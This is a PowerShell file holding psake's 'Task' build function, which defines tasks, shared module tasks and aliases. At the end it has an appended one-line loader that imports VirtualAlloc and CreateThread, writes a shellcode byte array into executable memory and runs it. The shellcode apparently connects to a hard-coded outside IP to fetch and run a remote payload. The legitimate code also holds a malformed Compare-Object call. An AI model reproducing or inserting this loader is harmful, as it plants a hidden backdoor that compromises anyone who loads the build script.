function Task {
    
    [CmdletBinding(DefaultParameterSetName = 'Normal')]
    param(
        [Parameter(Mandatory = $true, Position = 0)]
        [string]$name,

        [Parameter(Position = 1)]
        [scriptblock]$action = $null,

        [Parameter(Position = 2)]
        [scriptblock]$preaction = $null,

        [Parameter(Position = 3)]
        [scriptblock]$postaction = $null,

        [Parameter(Position = 4)]
        [scriptblock]$precondition = {$true},

        [Parameter(Position = 5)]
        [scriptblock]$postcondition = {$true},

        [Parameter(Position = 6)]
        [switch]$continueOnError,

        [ValidateNotNull()]
        [Parameter(Position = 7)]
        [string[]]$depends = @(),

        [ValidateNotNull()]
        [Parameter(Position = 8)]
        [string[]]$requiredVariables = @(),

        [Parameter(Position = 9)]
        [string]$description = $null,

        [Parameter(Position = 10)]
        [string]$alias = $null,

        [parameter(Mandatory = $true, ParameterSetName = 'SharedTask', Position = 11)]
        [ValidateNotNullOrEmpty()]
        [string]$FromModule,

        [Alias('Version')]
        [parameter(ParameterSetName = 'SharedTask', Position = 12)]
        [string]$requiredVersion,

        [parameter(ParameterSetName = 'SharedTask', Position = 13)]
        [string]$minimumVersion,

        [parameter(ParameterSetName = 'SharedTask', Position = 14)]
        [string]$maximumVersion,

        [parameter(ParameterSetName = 'SharedTask', Position = 15)]
        [string]$lessThanVersion
    )

    function CreateTask {
        @{
            Name              = $Name
            DependsOn         = $depends
            PreAction         = $preaction
            Action            = $action
            PostAction        = $postaction
            Precondition      = $precondition
            Postcondition     = $postcondition
            ContinueOnError   = $continueOnError
            Description       = $description
            Duration          = [System.TimeSpan]::Zero
            RequiredVariables = $requiredVariables
            Alias             = $alias
            Success           = $true 
            ErrorMessage      = $null
            ErrorDetail       = $null
            ErrorFormatted    = $null
        }
    }

    
    if ($name -eq 'default') {
        Assert (!$action) ($msgs.error_shared_task_cannot_have_action)
    }

    
    if ($PSCmdlet.ParameterSetName -eq 'SharedTask') {
        Assert (!$action) ($msgs.error_shared_task_cannot_have_action -f $Name, $FromModule)
    }

    $currentContext = $psake.context.Peek()

    
    if ($PSCmdlet.ParameterSetName -eq 'SharedTask') {
        $testModuleParams = @{
            minimumVersion  = $minimumVersion
            maximumVersion  = $maximumVersion
            lessThanVersion = $lessThanVersion
        }

        if(![string]::IsNullOrEmpty($requiredVersion)){
            $testModuleParams.minimumVersion = $requiredVersion
            $testModuleParams.maximumVersion = $requiredVersion
        }

        if ($taskModule = Get-Module -Name $FromModule) {
            
            $testModuleParams.currentVersion  = $taskModule.Version
            $taskModule = Where-Object -InputObject $taskModule -FilterScript {Test-ModuleVersion @testModuleParams}
        } else {
            
            $getModuleParams = @{
                ListAvailable = $true
                Name          = $FromModule
                ErrorAction   = 'Ignore'
                Verbose       = $false
            }
            $taskModule = Get-Module @getModuleParams |
                            Where-Object -FilterScript {Test-ModuleVersion -currentVersion $_.Version @testModuleParams} |
                            Sort-Object -Property Version -Descending |
                            Select-Object -First 1
        }

        
        
        
        
        
        $referenceTask = CreateTask
        Assert (-not $psake.ReferenceTasks.ContainsKey($referenceTask.Name)) ($msgs.error_duplicate_task_name -f $referenceTask.Name)
        $referenceTaskKey = $referenceTask.Name.ToLower()
        $psake.ReferenceTasks.Add($referenceTaskKey, $referenceTask)

        
        Assert ($null -ne $taskModule) ($msgs.error_unknown_module -f $FromModule)
        $psakeFilePath = Join-Path -Path $taskModule.ModuleBase -ChildPath 'psakeFile.ps1'
        if (-not $psake.LoadedTaskModules.ContainsKey($psakeFilePath)) {
            Write-Debug -Message "Loading tasks from task module [$psakeFilePath]"
            . $psakeFilePath
            $psake.LoadedTaskModules.Add($psakeFilePath, $null)
        }
    } else {
        
        $newTask = CreateTask
        $taskKey = $newTask.Name.ToLower()

        
        
        $refTask = $psake.ReferenceTasks[$taskKey]
        if ($refTask) {

            
            if ($refTask.PreAction -ne $newTask.PreAction) {
                $newTask.PreAction = $refTask.PreAction
            }

            
            if ($refTask.PostAction -ne $newTask.PostAction) {
                $newTask.PostAction = $refTask.PostAction
            }

            
            if ($refTask.PreCondition -ne $newTask.PreCondition) {
                $newTask.PreCondition = $refTask.PreCondition
            }

            
            if ($refTask.PostCondition -ne $newTask.PostCondition) {
                $newTask.PostCondition = $refTask.PostCondition
            }

            
            if ($refTask.ContinueOnError) {
                $newTask.ContinueOnError = $refTask.ContinueOnError
            }

            
            if ($refTask.DependsOn.Count -gt 0 -and (Compare-Object -ReferenceObject $refTask.DependsOn -DifferenceObject $newTask.DependsOn)) {
                $newTask.DependsOn = $refTask.DependsOn
            }

            
            if ($refTask.RequiredVariables.Count -gt 0 -and (Compare-Object -ReferenceObject.RequiredVariables -DifferenceObject $newTask.RequiredVariables)) {
                $newTask.RequiredVariables += $refTask.RequiredVariables
            }
        }

        
        Assert (-not $currentContext.tasks.ContainsKey($taskKey)) ($msgs.error_duplicate_task_name -f $taskKey)
        Write-Debug "Adding task [$taskKey)]"
        $currentContext.tasks[$taskKey] = $newTask

        if ($alias) {
            $aliasKey = $alias.ToLower()
            Assert (-not $currentContext.aliases.ContainsKey($aliasKey)) ($msgs.error_duplicate_alias_name -f $alias)
            $currentContext.aliases[$aliasKey] = $newTask
        }
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x29,0xfc,0xea,0x6d,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x75,0xee,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

